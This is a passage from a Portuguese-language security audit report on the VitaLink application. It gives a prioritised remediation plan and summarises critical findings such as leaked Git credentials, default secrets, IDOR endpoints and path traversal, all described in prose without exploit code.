    - Definir `CORS_ORIGIN=https://homolog.vitalink.app.br` no `.env`.
    - Remover wildcard padrão.

12. **[#14] Adicionar Content-Security-Policy**
    - Configurar CSP estrito no Helmet.

13. **[#23] Atualizar @faker-js/faker**
    - `npm install @faker-js/faker@10.6.0`.

---

### Prioridade Média (Corrigir em 1 mês)

14. **[#4] Implementar refresh token (opcional)**
    - Se UX de re-login for problema.

15. **[#8] Melhorar validação de e-mail**
    - Regex mais rigoroso.

16. **[#9] Validar campos numéricos**
    - Adicionar validação em `crudFactory.js`.

17. **[#16-17] Corrigir bugs de ordenação**
    - Documentar comportamento de filtros.

18. **[#18] Remover stack trace em produção**
    - Atualizar `errorHandler.js`.

19. **[#19] Adicionar transactions**
    - Helper `withTransaction`.
    - Aplicar em `upsertPacienteOnboarding`, etc.

20. **[#20] Padronizar timezone**
    - Configurar `America/Sao_Paulo` no pool pg.

21. **[#21] Adicionar testes**
    - Jest + Supertest (backend).
    - Vitest (frontend).
    - Mínimo: testes de autenticação e RBAC.

22. **[#22] Configurar linter**
    - ESLint + Prettier.
    - Pre-commit hook.

23. **[#24] Separar migrations do boot**
    - Rodar `db-prepare.js` no CI/CD, não no entrypoint.

---

### Prioridade Baixa (Backlog)

24. **[#15] Adicionar request ID em logs**
25. **Consolidar schema base e patches**
    - Remover patches aplicados, atualizar `schema.postgres.sql`.
26. **Remover schema MySQL legado**
27. **Mover protótipo para `legacy-prototype/`**
28. **Implementar backups automatizados**
29. **Adicionar healthcheck no frontend (docker-compose)**
30. **Documentar timezone na API**
31. **Criar guia de estilo (`CONTRIBUTING.md`)**

---

## 8. Resumo dos 10 Achados Mais Críticos

1. **[#1 CRÍTICO]** Credenciais do servidor versionadas no histórico Git (commit `fc65f88`) — repositório público.
2. **[#2 CRÍTICO]** Segredos padrão no Docker Compose (`JWT_SECRET`, `DB_PASSWORD`) usados em produção.
3. **[#3 CRÍTICO]** Ausência de rate limiting — API vulnerável a brute-force e DoS.
4. **[#6 CRÍTICO]** IDOR em endpoints sem escopo (`DELETE /consultas/:id`, `GET /me/paciente?id=`).
5. **[Divergência CRÍTICA]** 20 arquivos modificados não commitados no servidor de homologação — risco de perda de trabalho.
6. **[#13 ALTO]** CORS permissivo com wildcard (`*`) — qualquer site pode acessar a API.
7. **[#5 ALTO]** Hard-coded permissions para Paciente/Autocuidado ignoram tabela RBAC.
8. **[#10 ALTO]** Path traversal em UPLOAD_ROOT — risco de sobrescrita de arquivos do sistema.
9. **[#11 MÉDIO]** Falta validação de magic bytes em uploads — risco de malware mascarado.
10. **[#12 MÉDIO]** Arquivos `/uploads` públicos sem autenticação — vazamento de exames/documentos.

---

## Conclusão

O VitaLink é uma aplicação funcional com boa separação de responsabilidades, mas apresenta **riscos críticos de segurança** que requerem ação imediata:
- Credenciais expostas no Git.
- Segredos padrão em produção.
- Falta de rate limiting.
- Vulnerabilidades IDOR em endpoints de pacientes.
- Divergência massiva entre código em produção e repositório Git.

A correção dos 5 achados críticos (seção 7, Prioridade Crítica) deve ser feita **antes de qualquer novo feature**. A ausência de testes (#21) aumenta o risco de regressões ao corrigir esses problemas — recomenda-se adicionar testes de autenticação e RBAC **em paralelo** às correções de segurança.

O plano de sincronização (seção 6.4) deve ser executado imediatamente para trazer as 20 mudanças do servidor para o Git, estabelecendo um estado consistente entre todos os ambientes.

---

**Fim do relatório.**
